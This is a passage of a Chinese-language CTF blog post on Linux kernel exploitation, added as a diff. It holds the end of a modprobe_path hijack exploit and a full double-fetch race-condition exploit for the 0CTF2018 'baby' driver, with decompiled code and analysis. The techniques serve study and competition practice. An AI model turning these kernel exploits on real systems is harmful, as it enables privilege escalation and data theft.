+	printf(&quot;[+] modprobe_path: %lx\n&quot;, modprobe_path);
+	
+	// hijack modprobe_path
+	write_to_heap(fd1, 0x0061612f706d742f, modprobe_path - procfs_buffer);
+	
+	system(&quot;echo -ne '\\xff\\xff\\xff\\xff' &gt;&gt; /tmp/dummy&quot;);
+	system(&quot;echo '#!/bin/sh\nchmod 777 /flag' &gt;&gt; /tmp/aa&quot;);
+	system(&quot;chmod 777 /tmp/dummy; chmod 777 /tmp/aa&quot;);
+	
+	system(&quot;/tmp/dummy&quot;);
+	
+	getchar();
+
+	return 0;
+}
+</code></pre>
+<h2 id="double-fetch">Double fetch</h2>
+<p>这个属于条件竞争类的利用，在某些时候kernel第一次拿到一个值，判断合法之后，距离使用还存在一定的窗口期，在这个期间利用条件竞争漏洞修改掉那个值，即可达成恶意目的。</p>
+<h3 id="0ctf2018-final-baby">0CTF2018-final-baby</h3>
+<h4 id="分析-6">分析</h4>
+<p><code>baby_ioctl</code>的本意就是让你传一个地址和长度，如果和内核中flag的内容一致的话，就可以直接打印出flag了，而且在传参数0x6666的时候会直接白给内核态中真flag的地址。</p>
+<p>不过在函数<code>_chk_range_not_ok</code>里限制了我们传入的flag必须在用户态的空间之内。</p>
+<pre><code class="language-c">bool __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, unsigned __int64 a3)
+{
+  bool v3; // cf
+  unsigned __int64 v4; // rdi
+  bool result; // al
+
+  v3 = __CFADD__(a2, a1);
+  v4 = a2 + a1;
+  if ( v3 )
+    result = 1;
+  else
+    result = a3 &lt; v4;
+  return result;
+}
+
+__int64 __fastcall sub_25(__int64 a1, int a2, __int64 a3)
+{
+  __int64 result; // rax
+  int i; // [rsp+1Ch] [rbp-54h]
+
+  if ( a2 == 0x6666 )
+  {
+    printk(&quot;Your flag is at %px! But I don't think you know it's content\n&quot;, flag);
+    result = 0LL;
+  }
+  else if ( a2 == 0x1337
+         &amp;&amp; !_chk_range_not_ok(a3, 16LL, *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 4952))
+         &amp;&amp; !_chk_range_not_ok(
+               *(_QWORD *)a3,
+               *(int *)(a3 + 8),
+               *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 4952))
+         &amp;&amp; *(_DWORD *)(a3 + 8) == strlen(flag) )
+  {
+    for ( i = 0; i &lt; strlen(flag); ++i )
+    {
+      if ( *(_BYTE *)(*(_QWORD *)a3 + i) != flag[i] )
+        return 22LL;
+    }
+    printk(&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;, flag);
+    result = 0LL;
+  }
+  else
+  {
+    result = 14LL;
+  }
+  return result;
+}
+
+__int64 baby_ioctl()
+{
+  _fentry__();
+  return sub_25();
+}
+</code></pre>
+<p>一看启动脚本</p>
+<pre><code class="language-sh">qemu-system-x86_64 \
+-m 256M -smp 2,cores=2,threads=1  \
+-kernel ./vmlinuz-4.15.0-22-generic \
+-initrd  ./core.cpio \
+-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot; \
+-cpu qemu64 \
+-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
+-nographic  -enable-kvm  \
+</code></pre>
+<p>双核，可能存在条件竞争类漏洞。</p>
+<p>联想到double fetch的思路，可以尝试在传入flag地址，通过<code>_chk_range_not_ok</code>的检查之后用子线程修改掉传入的flag地址为真正的flag地址，从而让他直接打印出flag。</p>
+<p>（也有一种魔鬼思路是利用mmap开出一块地址，然后将猜测的flag放在mmap这块空间的末位，然后利用是否造成kernel pannic来逐步爆破flag，最多只需要爆破2k+次就能成功）</p>
+<h4 id="exp-6">exp</h4>
+<pre><code class="language-c">#include &lt;pthread.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/types.h&gt;
+
+#define COMPETATION_TIME 0x1000
+
+pthread_t competation_thread;
+
+char buf[0x1000];
+
+uint32_t attack = 1;
+char * real_addr;
+
+struct {
+	char * flag_addr;
+	uint32_t flag_len;
+} flag = {.flag_addr = buf, .flag_len = 33};
+
+void race_condition() {
+	while(attack) {
+		for(int i = 0; i &lt; COMPETATION_TIME; ++i) {
+			flag.flag_addr = real_addr;
+		}
+	}
+}
+
+int main() {
+	int fd, addr_fd, result_fd;
+	fd = open(&quot;/dev/baby&quot;, O_RDWR);
+	ioctl(fd, 0x6666);
+	
+	system(&quot;dmesg | grep flag &gt;./addr&quot;);
+	addr_fd = open(&quot;./addr&quot;, O_RDONLY);
+	
+	buf[read(addr_fd, buf, 0x100)] = '\x00';
+	
+	char *leak_flag_addr = strstr(buf, &quot;Your flag is at &quot;) + 0x10;
+	real_addr = strtoull(leak_flag_addr, leak_flag_addr + 0x10, 0x10);
+	printf(&quot;\033[34m[+]flag addr: 0x%llx\033[m\n&quot;, real_addr);
+	
+	pthread_create(&amp;competation_thread, NULL, race_condition, NULL);
+	
+	while(attack) {
+		for(int i = 0; i &lt; COMPETATION_TIME; ++i) {
+			flag.flag_addr = buf;
+			ioctl(fd, 0x1337, &amp;flag);
+		}
+		system(&quot;dmesg | grep flag &gt;./result&quot;);
+		result_fd = open(&quot;./result&quot;, O_RDONLY);
+		
+		read(result_fd, buf, 0x100);
+		if(strstr(buf, &quot;flag{&quot;)) {
+			attack = 0;
+		}
+	}
+	
+	pthread_cancel(competation_thread);
+	
+	puts(&quot;\033[34m[+]success!\033[m&quot;);
+	system(&quot;dmesg | grep flag&quot;);
+	
+	return 0;
+}
+</code></pre>
+<h1 id="参考文章">参考文章</h1>
+<p><a href="https://www.jianshu.com/p/a2259cd3e79e">https://www.jianshu.com/p/a2259cd3e79e</a></p>
+<p><a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/">https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#basic">BASIC</a>
+<ul>
+<li><a href="#environment">environment</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">文件系统</a></li>
+<li><a href="#cred%E7%BB%93%E6%9E%84%E4%BD%93">cred结构体</a></li>
+<li><a href="#%E5%86%85%E6%A0%B8%E6%80%81%E5%87%BD%E6%95%B0">内核态函数</a></li>
+<li><a href="#gdb%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95">gdb远程调试</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E8%84%9A%E6%9C%AC">远程脚本</a></li>
+</ul>
+</li>
+<li><a href="#attack">ATTACK</a>
+<ul>
+<li><a href="#kernel-uaf">Kernel UAF</a>
+<ul>
+<li><a href="#babydriver">babydriver</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
+<li><a href="#exp">exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#kernel-rop">Kernel ROP</a>
+<ul>
+<li><a href="#core">core</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-2">分析</a></li>
+<li><a href="#exp-2">exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#smep-ret2usr">SMEP &amp; ret2usr</a>
+<ul>
+<li><a href="#%E5%86%8D%E7%9C%8Bcore">再看core</a></li>
+<li><a href="#smep-smap">SMEP &amp; SMAP</a>
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#bypass">Bypass</a></li>
+</ul>
+</li>
+<li><a href="#resolve-babydriver-hijack-tty_operation-ret2usr">REsolve: babydriver (hijack tty_operation + ret2usr)</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-3">分析</a></li>
+<li><a href="#exp-3">exp</a></li>
+</ul>
+</li>
+<li><a href="#re-resolve-babydriver-msg_msg-seq_file-pt_regs-ret2usr">RE: REsolve: babydriver (msg_msg + seq_file + pt_regs + ret2usr)</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-4">分析</a></li>
+<li><a href="#exp-4">exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#hijack-modprobe_path">Hijack modprobe_path</a>
+<ul>
+<li><a href="#rwontheheap">rwOnTheHeap</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-5">分析</a></li>
+<li><a href="#exp-5">exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#double-fetch">Double fetch</a>
+<ul>
+<li><a href="#0ctf2018-final-baby">0CTF2018-final-baby</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-6">分析</a></li>
+<li><a href="#exp-6">exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">参考文章</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://kotoriseed.github.io/post/siscn西南分区赛 pwn/">
+              <h3 class="post-title">
+                CISCN-2022-西南分区赛PWN WP
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
